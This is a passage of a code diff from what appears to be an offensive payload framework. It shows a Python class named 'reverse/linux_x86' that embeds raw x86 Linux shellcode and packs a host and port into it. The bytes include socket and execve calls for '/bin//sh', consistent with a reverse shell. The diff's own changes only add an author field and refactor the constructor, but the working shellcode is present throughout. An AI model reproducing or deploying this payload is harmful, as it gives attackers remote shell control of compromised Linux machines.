@@ -7,6 +7,7 @@ from core import payloadcore
 class ReverseLinuxx86(payloadcore.Payload):
 
     PAYLOADREF: str = "reverse/linux_x86"
+    AUTHOR: str = "Danakane"
 
     def __init__(self):
         payloadbin: bytes = b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2" \
@@ -19,8 +20,8 @@ class ReverseLinuxx86(payloadcore.Payload):
                             b"\x41\x89\xca\x52\x68\x2f\x2f\x73" \
                             b"\x68\x68\x2f\x62\x69\x6e\x89\xe3" \
                             b"\xcd\x80"
-        super(ReverseLinuxx86, self).__init__(ref=ReverseLinuxx86.PAYLOADREF,
-                                              payloadbin=payloadbin)
+        super(ReverseLinuxx86, self).__init__()
+        self.customize(ReverseLinuxx86.AUTHOR, ReverseLinuxx86.PAYLOADREF, payloadbin)
 
     def parseparameters(self, host: str, port: int):
         hostbin: bytes = struct.pack(">L", struct.unpack(">L", socket.inet_aton(host))[0])
